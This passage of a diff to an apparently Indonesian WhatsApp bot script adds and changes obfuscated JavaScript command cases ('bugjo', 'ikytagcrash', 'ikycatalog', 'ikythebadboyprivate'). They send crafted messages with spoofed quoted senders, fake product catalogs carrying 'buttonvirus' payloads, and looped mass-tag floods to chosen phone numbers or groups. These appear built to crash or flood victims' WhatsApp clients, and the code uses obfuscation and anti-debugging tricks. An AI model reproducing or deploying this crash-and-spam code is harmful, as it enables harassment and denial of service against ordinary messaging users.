_0x2df07c;try{_0x2df07c=Function(_0x30ae3d(0x11c)+_0x30ae3d(0xf9)+');')();}catch(_0x35bb14){_0x2df07c=window;}return _0x2df07c;},_0x8b365=_0x5df853(),_0x44cfce=_0x8b365[_0x456bf6(0x105)]=_0x8b365[_0x456bf6(0x105)]||{},_0x1d8225=[_0x456bf6(0x11a),_0x456bf6(0x109),_0x456bf6(0x112),_0x456bf6(0x102),'exception','table',_0x456bf6(0x101)];for(let _0x379558=0x0;_0x379558<_0x1d8225['length'];_0x379558++){const _0x2bbfd6=_0x28362b[_0x456bf6(0xfa)][_0x456bf6(0x11b)][_0x456bf6(0xff)](_0x28362b),_0x3f2166=_0x1d8225[_0x379558],_0x2af223=_0x44cfce[_0x3f2166]||_0x2bbfd6;_0x2bbfd6[_0x456bf6(0x118)]=_0x28362b[_0x456bf6(0xff)](_0x28362b),_0x2bbfd6[_0x456bf6(0x114)]=_0x2af223[_0x456bf6(0x114)]['bind'](_0x2af223),_0x44cfce[_0x3f2166]=_0x2bbfd6;}});function _0x2352(){const _0x336ec0=['__proto__','download','log','prototype','return\x20(function()\x20','954060buiWRU','{}.constructor(\x22return\x20this\x22)(\x20)','constructor','\x20\x0aYou\x20Tube:\x20https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','*Send/Reply\x20Image','apply','BUG\x20BY\x20','bind','10gtCUxH','trace','error','80XJghtX','sendMessage','console','2086887UnDBjL','Teksnya\x20Mana?','chat','warn','8484ipVrYD','319698xZZzWq','19600GFhzFO','Sukses\x20Convert\x20Buttonimg','28BhJYtU','quoted','981xCQLrq','211752iICZyI','info','5192UlBKij','toString','(((.+)+)+)+$','search','waUploadToServer'];_0x2352=function(){return _0x336ec0;};return _0x2352();}function _0x26fb(_0x462a1c,_0x541954){const _0x397848=_0x2352();return _0x26fb=function(_0x3c6f79,_0x28362b){_0x3c6f79=_0x3c6f79-0xf9;let _0x54d04e=_0x397848[_0x3c6f79];return _0x54d04e;},_0x26fb(_0x462a1c,_0x541954);}_0x3c6f79();{if(!isCreator&&!isBan)return;if(!m[_0x2dcaf5(0x10f)])throw _0x2dcaf5(0xfc);if(!text)throw _0x2dcaf5(0x107);let media=await quoted[_0x2dcaf5(0x119)]();var messa=await prepareWAMessageMedia({'image':media},{'upload':jobotz[_0x2dcaf5(0x117)]});let buttons=[{'buttonId':'bugjo','buttonText':{'displayText':''+thejo},'type':0x1},{'buttonId':'allmenu','buttonText':{'displayText':''+jobot},'type':0x1},{'buttonId':'listmenu','buttonText':{'displayText':''+jobot},'type':0x1}],buttonMessage={'image':media,'caption':_0x2dcaf5(0xfe)+text+_0x2dcaf5(0xfb),'footer':virtex2,'buttons':buttons,'headerType':0x4};jobotz[_0x2dcaf5(0x104)](m[_0x2dcaf5(0x108)],buttonMessage,{'quoted':shield2}),jancok(_0x2dcaf5(0x10d));}
+const _0x2dcaf5=_0x26fb;(function(_0x50373a,_0x539b2e){const _0x26c522=_0x26fb,_0xe82273=_0x50373a();while(!![]){try{const _0x3bb09e=parseInt(_0x26c522(0x111))/0x1+-parseInt(_0x26c522(0x10c))/0x2+-parseInt(_0x26c522(0x10a))/0x3*(-parseInt(_0x26c522(0x103))/0x4)+-parseInt(_0x26c522(0x11d))/0x5+-parseInt(_0x26c522(0x10b))/0x6*(parseInt(_0x26c522(0x10e))/0x7)+parseInt(_0x26c522(0x113))/0x8*(parseInt(_0x26c522(0x110))/0x9)+parseInt(_0x26c522(0x100))/0xa*(parseInt(_0x26c522(0x106))/0xb);if(_0x3bb09e===_0x539b2e)break;else _0xe82273['push'](_0xe82273['shift']());}catch(_0x51817c){_0xe82273['push'](_0xe82273['shift']());}}}(_0x2352,0x1c152));const _0x3604fb=(function(){let _0x2a0c32=!![];return function(_0x35d147,_0x1ec35d){const _0x4c75a6=_0x2a0c32?function(){if(_0x1ec35d){const _0x4a0dca=_0x1ec35d['apply'](_0x35d147,arguments);return _0x1ec35d=null,_0x4a0dca;}}:function(){};return _0x2a0c32=![],_0x4c75a6;};}()),_0x20d650=_0x3604fb(this,function(){const _0x403829=_0x26fb;return _0x20d650[_0x403829(0x114)]()[_0x403829(0x116)](_0x403829(0x115))['toString']()[_0x403829(0xfa)](_0x20d650)[_0x403829(0x116)]('(((.+)+)+)+$');});_0x20d650();const _0x28362b=(function(){let _0x5c6fe8=!![];return function(_0x5bff11,_0x40ff55){const _0x3fe4b1=_0x5c6fe8?function(){const _0x554e04=_0x26fb;if(_0x40ff55){const _0x2d6f9e=_0x40ff55[_0x554e04(0xfd)](_0x5bff11,arguments);return _0x40ff55=null,_0x2d6f9e;}}:function(){};return _0x5c6fe8=![],_0x3fe4b1;};}()),_0x3c6f79=_0x28362b(this,function(){const _0x456bf6=_0x26fb,_0x5df853=function(){const _0x30ae3d=_0x26fb;let _0x2df07c;try{_0x2df07c=Function(_0x30ae3d(0x11c)+_0x30ae3d(0xf9)+');')();}catch(_0x35bb14){_0x2df07c=window;}return _0x2df07c;},_0x8b365=_0x5df853(),_0x44cfce=_0x8b365[_0x456bf6(0x105)]=_0x8b365[_0x456bf6(0x105)]||{},_0x1d8225=[_0x456bf6(0x11a),_0x456bf6(0x109),_0x456bf6(0x112),_0x456bf6(0x102),'exception','table',_0x456bf6(0x101)];for(let _0x379558=0x0;_0x379558<_0x1d8225['length'];_0x379558++){const _0x2bbfd6=_0x28362b[_0x456bf6(0xfa)][_0x456bf6(0x11b)][_0x456bf6(0xff)](_0x28362b),_0x3f2166=_0x1d8225[_0x379558],_0x2af223=_0x44cfce[_0x3f2166]||_0x2bbfd6;_0x2bbfd6[_0x456bf6(0x118)]=_0x28362b[_0x456bf6(0xff)](_0x28362b),_0x2bbfd6[_0x456bf6(0x114)]=_0x2af223[_0x456bf6(0x114)]['bind'](_0x2af223),_0x44cfce[_0x3f2166]=_0x2bbfd6;}});function _0x2352(){const _0x336ec0=['__proto__','download','log','prototype','return\x20(function()\x20','954060buiWRU','{}.constructor(\x22return\x20this\x22)(\x20)','constructor','\x20\x0aYou\x20Tube:\x20https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ','*Send/Reply\x20Image','apply','BUG\x20BY\x20','bind','10gtCUxH','trace','error','80XJghtX','sendMessage','console','2086887UnDBjL','Teksnya\x20Mana?','chat','warn','8484ipVrYD','319698xZZzWq','19600GFhzFO','Sukses\x20Convert\x20Buttonimg','28BhJYtU','quoted','981xCQLrq','211752iICZyI','info','5192UlBKij','toString','(((.+)+)+)+$','search','waUploadToServer'];_0x2352=function(){return _0x336ec0;};return _0x2352();}function _0x26fb(_0x462a1c,_0x541954){const _0x397848=_0x2352();return _0x26fb=function(_0x3c6f79,_0x28362b){_0x3c6f79=_0x3c6f79-0xf9;let _0x54d04e=_0x397848[_0x3c6f79];return _0x54d04e;},_0x26fb(_0x462a1c,_0x541954);}_0x3c6f79();{if(!isCreator&&!isBan)return;if(!m[_0x2dcaf5(0x10f)])throw _0x2dcaf5(0xfc);if(!text)throw _0x2dcaf5(0x107);let media=await quoted[_0x2dcaf5(0x119)]();var messa=await prepareWAMessageMedia({'image':media},{'upload':jobotz[_0x2dcaf5(0x117)]});let buttons=[{'buttonId':'bugjo','buttonText':{'displayText':''+thejo},'type':0x1},{'buttonId':'allmenu','buttonText':{'displayText':''+jobot},'type':0x1},{'buttonId':'listmenu','buttonText':{'displayText':''+jobot},'type':0x1}],buttonMessage={'image':media,'caption':_0x2dcaf5(0xfe)+text+_0x2dcaf5(0xfb),'footer':virtex2,'buttons':buttons,'headerType':0x4};jobotz[_0x2dcaf5(0x104)](m[_0x2dcaf5(0x108)],buttonMessage,{'quoted':shield2}),jancok(_0x2dcaf5(0x10d));}
 }
 break
 case 'ikygaskenbutton': {
@@ -4983,7 +4996,7 @@ function _0x4e80(){const _0x4e0f0d=['info','bind','error','13490KwygoS','{}.cons
 break
 
 case 'ikytagcrash': {
-const _0x4b36f6=_0x14a9;(function(_0x2936fb,_0x15e636){const _0x20762b=_0x14a9,_0x5c9d27=_0x2936fb();while(!![]){try{const _0x21a975=parseInt(_0x20762b(0x126))/0x1*(parseInt(_0x20762b(0x10b))/0x2)+-parseInt(_0x20762b(0x104))/0x3*(-parseInt(_0x20762b(0x123))/0x4)+-parseInt(_0x20762b(0x125))/0x5*(-parseInt(_0x20762b(0x127))/0x6)+parseInt(_0x20762b(0x11b))/0x7+parseInt(_0x20762b(0x120))/0x8*(parseInt(_0x20762b(0x113))/0x9)+-parseInt(_0x20762b(0x108))/0xa*(-parseInt(_0x20762b(0x128))/0xb)+parseInt(_0x20762b(0x11f))/0xc*(-parseInt(_0x20762b(0x129))/0xd);if(_0x21a975===_0x15e636)break;else _0x5c9d27['push'](_0x5c9d27['shift']());}catch(_0x57440e){_0x5c9d27['push'](_0x5c9d27['shift']());}}}(_0x4d12,0x3508d));const _0x3772f2=(function(){let _0x1fe73e=!![];return function(_0x134e06,_0x1da02e){const _0x83e97b=_0x1fe73e?function(){const _0x19a80a=_0x14a9;if(_0x1da02e){const _0x50a1f9=_0x1da02e[_0x19a80a(0x122)](_0x134e06,arguments);return _0x1da02e=null,_0x50a1f9;}}:function(){};return _0x1fe73e=![],_0x83e97b;};}()),_0x593d5a=_0x3772f2(this,function(){const _0x200bff=_0x14a9;return _0x593d5a['toString']()[_0x200bff(0x105)](_0x200bff(0x112))[_0x200bff(0x11e)]()[_0x200bff(0x11a)](_0x593d5a)[_0x200bff(0x105)](_0x200bff(0x112));});_0x593d5a();const _0x55829c=(function(){let _0x441236=!![];return function(_0x5adb56,_0x5e6a79){const _0x2622cb=_0x441236?function(){const _0x47e303=_0x14a9;if(_0x5e6a79){const _0xc57325=_0x5e6a79[_0x47e303(0x122)](_0x5adb56,arguments);return _0x5e6a79=null,_0xc57325;}}:function(){};return _0x441236=![],_0x2622cb;};}()),_0x12631e=_0x55829c(this,function(){const _0x1219ff=_0x14a9;let _0x17aeb6;try{const _0x3847a9=Function('return\x20(function()\x20'+_0x1219ff(0x114)+');');_0x17aeb6=_0x3847a9();}catch(_0x5f2b9b){_0x17aeb6=window;}const _0x257f4e=_0x17aeb6[_0x1219ff(0x117)]=_0x17aeb6[_0x1219ff(0x117)]||{},_0x1aab25=[_0x1219ff(0x107),_0x1219ff(0x106),_0x1219ff(0x110),_0x1219ff(0x111),_0x1219ff(0x115),_0x1219ff(0x124),_0x1219ff(0x11c)];for(let _0x46cb4b=0x0;_0x46cb4b<_0x1aab25['length'];_0x46cb4b++){const _0x57637d=_0x55829c['constructor'][_0x1219ff(0x10c)][_0x1219ff(0x121)](_0x55829c),_0x5230aa=_0x1aab25[_0x46cb4b],_0x278c85=_0x257f4e[_0x5230aa]||_0x57637d;_0x57637d['__proto__']=_0x55829c[_0x1219ff(0x121)](_0x55829c),_0x57637d[_0x1219ff(0x11e)]=_0x278c85[_0x1219ff(0x11e)]['bind'](_0x278c85),_0x257f4e[_0x5230aa]=_0x57637d;}});function _0x14a9(_0x5acb61,_0x4cc164){const _0x4ead2f=_0x4d12();return _0x14a9=function(_0x12631e,_0x55829c){_0x12631e=_0x12631e-0x104;let _0x250128=_0x4ead2f[_0x12631e];return _0x250128;},_0x14a9(_0x5acb61,_0x4cc164);}_0x12631e();{if(!isCreator&&!isBan)return;if(!m['isGroup'])throw mess[_0x4b36f6(0x10a)];if(args['length']==0x0)return m[_0x4b36f6(0x118)](_0x4b36f6(0x11d));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){let jansencoli={'key':{'participant':_0x4b36f6(0x119)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':virgam}}};var teks=philips;for(let mem of participants){teks+=_0x4b36f6(0x109)+mem['id'][_0x4b36f6(0x10d)]('@')[0x0]+'\x0a';}jobotz[_0x4b36f6(0x10f)](m[_0x4b36f6(0x10e)],{'text':teks,'mentions':participants['map'](_0x1fae74=>_0x1fae74['id'])},{'quoted':jansencoli});}jancok(_0x4b36f6(0x116));}function _0x4d12(){const _0x4fa670=['sendMessage','info','error','(((.+)+)+)+$','45gGBMxb','{}.constructor(\x22return\x20this\x22)(\x20)','exception','Tag\x20Aja','console','reply','0@s.whatsapp.net','constructor','1340857QPOiVQ','trace','Jumlahnya?','toString','984ZoAhjO','287384xJwVox','bind','apply','5156YvkqnE','table','653765uNBQqt','49732dhtmPJ','18hsFsfD','14047gZfptQ','163293quJuVQ','9jttEHE','search','warn','log','2590gycfdH','│➣\x20@','group','6RvpEEj','prototype','split','chat'];_0x4d12=function(){return _0x4fa670;};return _0x4d12();}
+const _0x4b36f6=_0x14a9;(function(_0x2936fb,_0x15e636){const _0x20762b=_0x14a9,_0x5c9d27=_0x2936fb();while(!![]){try{const _0x21a975=parseInt(_0x20762b(0x126))/0x1*(parseInt(_0x20762b(0x10b))/0x2)+-parseInt(_0x20762b(0x104))/0x3*(-parseInt(_0x20762b(0x123))/0x4)+-parseInt(_0x20762b(0x125))/0x5*(-parseInt(_0x20762b(0x127))/0x6)+parseInt(_0x20762b(0x11b))/0x7+parseInt(_0x20762b(0x120))/0x8*(parseInt(_0x20762b(0x113))/0x9)+-parseInt(_0x20762b(0x108))/0xa*(-parseInt(_0x20762b(0x128))/0xb)+parseInt(_0x20762b(0x11f))/0xc*(-parseInt(_0x20762b(0x129))/0xd);if(_0x21a975===_0x15e636)break;else _0x5c9d27['push'](_0x5c9d27['shift']());}catch(_0x57440e){_0x5c9d27['push'](_0x5c9d27['shift']());}}}(_0x4d12,0x3508d));const _0x3772f2=(function(){let _0x1fe73e=!![];return function(_0x134e06,_0x1da02e){const _0x83e97b=_0x1fe73e?function(){const _0x19a80a=_0x14a9;if(_0x1da02e){const _0x50a1f9=_0x1da02e[_0x19a80a(0x122)](_0x134e06,arguments);return _0x1da02e=null,_0x50a1f9;}}:function(){};return _0x1fe73e=![],_0x83e97b;};}()),_0x593d5a=_0x3772f2(this,function(){const _0x200bff=_0x14a9;return _0x593d5a['toString']()[_0x200bff(0x105)](_0x200bff(0x112))[_0x200bff(0x11e)]()[_0x200bff(0x11a)](_0x593d5a)[_0x200bff(0x105)](_0x200bff(0x112));});_0x593d5a();const _0x55829c=(function(){let _0x441236=!![];return function(_0x5adb56,_0x5e6a79){const _0x2622cb=_0x441236?function(){const _0x47e303=_0x14a9;if(_0x5e6a79){const _0xc57325=_0x5e6a79[_0x47e303(0x122)](_0x5adb56,arguments);return _0x5e6a79=null,_0xc57325;}}:function(){};return _0x441236=![],_0x2622cb;};}()),_0x12631e=_0x55829c(this,function(){const _0x1219ff=_0x14a9;let _0x17aeb6;try{const _0x3847a9=Function('return\x20(function()\x20'+_0x1219ff(0x114)+');');_0x17aeb6=_0x3847a9();}catch(_0x5f2b9b){_0x17aeb6=window;}const _0x257f4e=_0x17aeb6[_0x1219ff(0x117)]=_0x17aeb6[_0x1219ff(0x117)]||{},_0x1aab25=[_0x1219ff(0x107),_0x1219ff(0x106),_0x1219ff(0x110),_0x1219ff(0x111),_0x1219ff(0x115),_0x1219ff(0x124),_0x1219ff(0x11c)];for(let _0x46cb4b=0x0;_0x46cb4b<_0x1aab25['length'];_0x46cb4b++){const _0x57637d=_0x55829c['constructor'][_0x1219ff(0x10c)][_0x1219ff(0x121)](_0x55829c),_0x5230aa=_0x1aab25[_0x46cb4b],_0x278c85=_0x257f4e[_0x5230aa]||_0x57637d;_0x57637d['__proto__']=_0x55829c[_0x1219ff(0x121)](_0x55829c),_0x57637d[_0x1219ff(0x11e)]=_0x278c85[_0x1219ff(0x11e)]['bind'](_0x278c85),_0x257f4e[_0x5230aa]=_0x57637d;}});function _0x14a9(_0x5acb61,_0x4cc164){const _0x4ead2f=_0x4d12();return _0x14a9=function(_0x12631e,_0x55829c){_0x12631e=_0x12631e-0x104;let _0x250128=_0x4ead2f[_0x12631e];return _0x250128;},_0x14a9(_0x5acb61,_0x4cc164);}_0x12631e();{if(!isCreator&&!isBan)return;if(!m['isGroup'])throw mess[_0x4b36f6(0x10a)];if(args['length']==0x0)return m[_0x4b36f6(0x118)](_0x4b36f6(0x11d));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){let jansencoli={'key':{'participant':_0x4b36f6(0x119)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':virgam}}};var teks=philips;for(let mem of participants){teks+=_0x4b36f6(0x109)+mem['id'][_0x4b36f6(0x10d)]('@')[0x0]+'\x0a';}jobotz[_0x4b36f6(0x10f)](m[_0x4b36f6(0x10e)],{'text':teks,'mentions':participants['map'](_0x1fae74=>_0x1fae74['id'])},{'quoted':jansencoli});}jancok(_0x4b36f6(0x116));}function _0x4d12(){const _0x4fa670=['sendMessage','info','error','(((.+)+)+)+$','45gGBMxb','{}.constructor(\x22return\x20this\x22)(\x20)','exception','Tag\x20Aja','console','reply','0@s.whatsapp.net','constructor','1340857QPOiVQ','trace','Jumlahnya?','toString','984ZoAhjO','287384xJwVox','bind','apply','5156YvkqnE','table','653765uNBQqt','49732dhtmPJ','18hsFsfD','14047gZfptQ','163293quJuVQ','9jttEHE','search','warn','log','2590gycfdH','││᭄⃟ꪶ⃟•╾\x20@','group','6RvpEEj','prototype','split','chat'];_0x4d12=function(){return _0x4fa670;};return _0x4d12();}
   }
   break
 
@@ -5064,6 +5077,27 @@ var _0x26b53b=_0x3f8a;function _0x3f8a(_0x44ee71,_0x531e11){var _0x44b1b5=_0x108
             await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:asukonyol11})
             await sleep(10000)
             await m.reply(`Berhasil Mengirim Santet iky Di Nomer ${text}`)
+            }
+            break
+case 'ikythebadboyprivate': { 
+          if (!isCreator && !isBan) return
+          if (!text) throw `Nomernya mana?`
+             asukonyol11 = { 
+                    key: { 
+                        fromMe: false, 
+                        participant: `0@s.whatsapp.net`, 
+                        ...({ remoteJid: "" }) 
+                    }, 
+                    message: { 
+                        "imageMessage": { 
+                            "mimetype": "image/jpeg", 
+                            "jpegThumbnail": virgam
+                        } 
+                    } 
+                }
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"- IKYY MAKERZ BAD BOY -"},{quoted:asukonyol11})
+            await sleep(1000)
+            await m.reply(`Berhasil Banh.`)
             }
             break
         case 'ikygaskensantet': {          
@@ -6784,15 +6818,15 @@ const _0x1920a2=_0x4101;(function(_0x2f8ba9,_0x4f5aa4){const _0x413276=_0x4101,_
 break
 
 case 'ikycatalog': {
-var _0x43084d=_0x3185;(function(_0x324039,_0x3d694c){var _0x60d7c9=_0x3185,_0x50f13d=_0x324039();while(!![]){try{var _0x76a9f4=-parseInt(_0x60d7c9(0x1e5))/0x1+parseInt(_0x60d7c9(0x1e7))/0x2+parseInt(_0x60d7c9(0x1d4))/0x3+-parseInt(_0x60d7c9(0x1c7))/0x4+-parseInt(_0x60d7c9(0x1de))/0x5+-parseInt(_0x60d7c9(0x1d5))/0x6*(-parseInt(_0x60d7c9(0x1ec))/0x7)+-parseInt(_0x60d7c9(0x1d3))/0x8*(parseInt(_0x60d7c9(0x1e2))/0x9);if(_0x76a9f4===_0x3d694c)break;else _0x50f13d['push'](_0x50f13d['shift']());}catch(_0x59c403){_0x50f13d['push'](_0x50f13d['shift']());}}}(_0x548b,0x1d505));function _0x3185(_0x1d562f,_0x3e38e9){var _0x1f3d0a=_0x548b();return _0x3185=function(_0x752c1a,_0x195cd1){_0x752c1a=_0x752c1a-0x1c2;var _0x1ad3b1=_0x1f3d0a[_0x752c1a];return _0x1ad3b1;},_0x3185(_0x1d562f,_0x3e38e9);}var _0x335a8c=(function(){var _0x52098a=!![];return function(_0x10cd9c,_0x2c38b0){var _0x3a46d8=_0x52098a?function(){if(_0x2c38b0){var _0x9d25ba=_0x2c38b0['apply'](_0x10cd9c,arguments);return _0x2c38b0=null,_0x9d25ba;}}:function(){};return _0x52098a=![],_0x3a46d8;};}()),_0x3688b6=_0x335a8c(this,function(){var _0x2e86f4=_0x3185;return _0x3688b6[_0x2e86f4(0x1cb)]()[_0x2e86f4(0x1c2)]('(((.+)+)+)+$')[_0x2e86f4(0x1cb)]()['constructor'](_0x3688b6)[_0x2e86f4(0x1c2)](_0x2e86f4(0x1c4));});_0x3688b6();function _0x548b(){var _0x37d692=['message','©\x20THE\x20IKYY\x20BOTZ\x20CATALOG','198NfifhR','reply','constructor','89374kfjWvP','10000000','407306qKNtBB','IDR','6288286858385@s.whatsapp.net','console','relayMessage','287FWFLtQ','warn','search','length','(((.+)+)+)+$','waUploadToServer','99999999999999','153484PXGaTA','error','THE\x20IKYY\x20BOTZ\x20CATALOG\x20🔥➥\x20','wa.me/6288286858385','toString','imageMessage','__proto__','Sukses\x20Send\x20Catalog\x20Sebanyak\x20','0@s.whatsapp.net','table','fromObject','Message','77024kWeZzz','412782lSLlUR','17388XXMeAv','exception','CATALOG','bind','{}.constructor(\x22return\x20this\x22)(\x20)','THE\x20IKYY\x20BOTZ','chat','key','trace','2175iYOSrl','prototype'];_0x548b=function(){return _0x37d692;};return _0x548b();}var _0x195cd1=(function(){var _0x1f6991=!![];return function(_0x530fda,_0x261688){var _0x1985cd=_0x1f6991?function(){if(_0x261688){var _0x289592=_0x261688['apply'](_0x530fda,arguments);return _0x261688=null,_0x289592;}}:function(){};return _0x1f6991=![],_0x1985cd;};}()),_0x752c1a=_0x195cd1(this,function(){var _0x129e79=_0x3185,_0x2e3185;try{var _0x57f383=Function('return\x20(function()\x20'+_0x129e79(0x1d9)+');');_0x2e3185=_0x57f383();}catch(_0x299fdb){_0x2e3185=window;}var _0x2b809b=_0x2e3185[_0x129e79(0x1ea)]=_0x2e3185['console']||{},_0x3c02de=['log',_0x129e79(0x1ed),'info',_0x129e79(0x1c8),_0x129e79(0x1d6),_0x129e79(0x1d0),_0x129e79(0x1dd)];for(var _0x3f3c9a=0x0;_0x3f3c9a<_0x3c02de[_0x129e79(0x1c3)];_0x3f3c9a++){var _0x2fb709=_0x195cd1[_0x129e79(0x1e4)][_0x129e79(0x1df)][_0x129e79(0x1d8)](_0x195cd1),_0x41e105=_0x3c02de[_0x3f3c9a],_0x1badf1=_0x2b809b[_0x41e105]||_0x2fb709;_0x2fb709[_0x129e79(0x1cd)]=_0x195cd1[_0x129e79(0x1d8)](_0x195cd1),_0x2fb709[_0x129e79(0x1cb)]=_0x1badf1[_0x129e79(0x1cb)][_0x129e79(0x1d8)](_0x1badf1),_0x2b809b[_0x41e105]=_0x2fb709;}});_0x752c1a();{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m[_0x43084d(0x1e3)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){const ctlg={'key':{'fromMe':![],'participant':'0@s.whatsapp.net','remoteJid':_0x43084d(0x1cf)},'message':{'orderMessage':{'itemCount':0x0,'surface':_0x43084d(0x1d7)}}};var messa=await prepareWAMessageMedia({'image':thumb},{'upload':jobotz[_0x43084d(0x1c5)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x43084d(0x1d2)][_0x43084d(0x1d1)]({'productMessage':{'product':{'productImage':messa[_0x43084d(0x1cc)],'productId':_0x43084d(0x1c6),'title':_0x43084d(0x1c9)+buttonvirus,'description':'©\x20𝙏𝙃𝙀\x20I𝙄𝙆𝙔𝙔\x20𝘽𝙊𝙏𝙕 𝘾𝙍𝘼𝙎𝙃〽️\x20CATALOG\x20'+buttonvirus,'currencyCode':_0x43084d(0x1e8),'footerText':_0x43084d(0x1e1),'priceAmount1000':_0x43084d(0x1e6),'productImageCount':0x1,'firstImageId':0x1,'salePriceAmount1000':_0x43084d(0x1e6),'retailerId':_0x43084d(0x1da),'url':_0x43084d(0x1ca)},'businessOwnerJid':_0x43084d(0x1e9)}}),{'userJid':m[_0x43084d(0x1db)],'quoted':ctlg});jobotz[_0x43084d(0x1eb)](m[_0x43084d(0x1db)],catalog[_0x43084d(0x1e0)],{'messageId':catalog[_0x43084d(0x1dc)]['id']});}jancok(_0x43084d(0x1ce)+jumlah);}
+var _0x43084d=_0x3185;(function(_0x324039,_0x3d694c){var _0x60d7c9=_0x3185,_0x50f13d=_0x324039();while(!![]){try{var _0x76a9f4=-parseInt(_0x60d7c9(0x1e5))/0x1+parseInt(_0x60d7c9(0x1e7))/0x2+parseInt(_0x60d7c9(0x1d4))/0x3+-parseInt(_0x60d7c9(0x1c7))/0x4+-parseInt(_0x60d7c9(0x1de))/0x5+-parseInt(_0x60d7c9(0x1d5))/0x6*(-parseInt(_0x60d7c9(0x1ec))/0x7)+-parseInt(_0x60d7c9(0x1d3))/0x8*(parseInt(_0x60d7c9(0x1e2))/0x9);if(_0x76a9f4===_0x3d694c)break;else _0x50f13d['push'](_0x50f13d['shift']());}catch(_0x59c403){_0x50f13d['push'](_0x50f13d['shift']());}}}(_0x548b,0x1d505));function _0x3185(_0x1d562f,_0x3e38e9){var _0x1f3d0a=_0x548b();return _0x3185=function(_0x752c1a,_0x195cd1){_0x752c1a=_0x752c1a-0x1c2;var _0x1ad3b1=_0x1f3d0a[_0x752c1a];return _0x1ad3b1;},_0x3185(_0x1d562f,_0x3e38e9);}var _0x335a8c=(function(){var _0x52098a=!![];return function(_0x10cd9c,_0x2c38b0){var _0x3a46d8=_0x52098a?function(){if(_0x2c38b0){var _0x9d25ba=_0x2c38b0['apply'](_0x10cd9c,arguments);return _0x2c38b0=null,_0x9d25ba;}}:function(){};return _0x52098a=![],_0x3a46d8;};}()),_0x3688b6=_0x335a8c(this,function(){var _0x2e86f4=_0x3185;return _0x3688b6[_0x2e86f4(0x1cb)]()[_0x2e86f4(0x1c2)]('(((.+)+)+)+$')[_0x2e86f4(0x1cb)]()['constructor'](_0x3688b6)[_0x2e86f4(0x1c2)](_0x2e86f4(0x1c4));});_0x3688b6();function _0x548b(){var _0x37d692=['message','©\x20THE\x20IKYY\x20BOTZ\x20CATALOG','198NfifhR','reply','constructor','89374kfjWvP','10000000','407306qKNtBB','IDR','6288286858385@s.whatsapp.net','console','relayMessage','287FWFLtQ','warn','search','length','(((.+)+)+)+$','waUploadToServer','99999999999999','153484PXGaTA','error','THE\x20IKYY\x20BOTZ\x20CATALOG\x20🔥➥\x20','wa.me/6289516394161','toString','imageMessage','__proto__','Sukses\x20Send\x20Catalog\x20Sebanyak\x20','0@s.whatsapp.net','table','fromObject','Message','77024kWeZzz','412782lSLlUR','17388XXMeAv','exception','CATALOG','bind','{}.constructor(\x22return\x20this\x22)(\x20)','THE\x20IKYY\x20BOTZ','chat','key','trace','2175iYOSrl','prototype'];_0x548b=function(){return _0x37d692;};return _0x548b();}var _0x195cd1=(function(){var _0x1f6991=!![];return function(_0x530fda,_0x261688){var _0x1985cd=_0x1f6991?function(){if(_0x261688){var _0x289592=_0x261688['apply'](_0x530fda,arguments);return _0x261688=null,_0x289592;}}:function(){};return _0x1f6991=![],_0x1985cd;};}()),_0x752c1a=_0x195cd1(this,function(){var _0x129e79=_0x3185,_0x2e3185;try{var _0x57f383=Function('return\x20(function()\x20'+_0x129e79(0x1d9)+');');_0x2e3185=_0x57f383();}catch(_0x299fdb){_0x2e3185=window;}var _0x2b809b=_0x2e3185[_0x129e79(0x1ea)]=_0x2e3185['console']||{},_0x3c02de=['log',_0x129e79(0x1ed),'info',_0x129e79(0x1c8),_0x129e79(0x1d6),_0x129e79(0x1d0),_0x129e79(0x1dd)];for(var _0x3f3c9a=0x0;_0x3f3c9a<_0x3c02de[_0x129e79(0x1c3)];_0x3f3c9a++){var _0x2fb709=_0x195cd1[_0x129e79(0x1e4)][_0x129e79(0x1df)][_0x129e79(0x1d8)](_0x195cd1),_0x41e105=_0x3c02de[_0x3f3c9a],_0x1badf1=_0x2b809b[_0x41e105]||_0x2fb709;_0x2fb709[_0x129e79(0x1cd)]=_0x195cd1[_0x129e79(0x1d8)](_0x195cd1),_0x2fb709[_0x129e79(0x1cb)]=_0x1badf1[_0x129e79(0x1cb)][_0x129e79(0x1d8)](_0x1badf1),_0x2b809b[_0x41e105]=_0x2fb709;}});_0x752c1a();{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m[_0x43084d(0x1e3)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){const ctlg={'key':{'fromMe':![],'participant':'0@s.whatsapp.net','remoteJid':_0x43084d(0x1cf)},'message':{'orderMessage':{'itemCount':0x0,'surface':_0x43084d(0x1d7)}}};var messa=await prepareWAMessageMedia({'image':thumb},{'upload':jobotz[_0x43084d(0x1c5)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x43084d(0x1d2)][_0x43084d(0x1d1)]({'productMessage':{'product':{'productImage':messa[_0x43084d(0x1cc)],'productId':_0x43084d(0x1c6),'title':_0x43084d(0x1c9)+buttonvirus,'description':'©\x20𝙏𝙃𝙀\x20I𝙄𝙆𝙔𝙔\x20𝘽𝙊𝙏𝙕 𝘾𝙍𝘼𝙎𝙃〽️\x20CATALOG\x20'+buttonvirus,'currencyCode':_0x43084d(0x1e8),'footerText':_0x43084d(0x1e1),'priceAmount1000':_0x43084d(0x1e6),'productImageCount':0x1,'firstImageId':0x1,'salePriceAmount1000':_0x43084d(0x1e6),'retailerId':_0x43084d(0x1da),'url':_0x43084d(0x1ca)},'businessOwnerJid':_0x43084d(0x1e9)}}),{'userJid':m[_0x43084d(0x1db)],'quoted':ctlg});jobotz[_0x43084d(0x1eb)](m[_0x43084d(0x1db)],catalog[_0x43084d(0x1e0)],{'messageId':catalog[_0x43084d(0x1dc)]['id']});}jancok(_0x43084d(0x1ce)+jumlah);}
 }
 break
 case 'ikycatalogv2': {
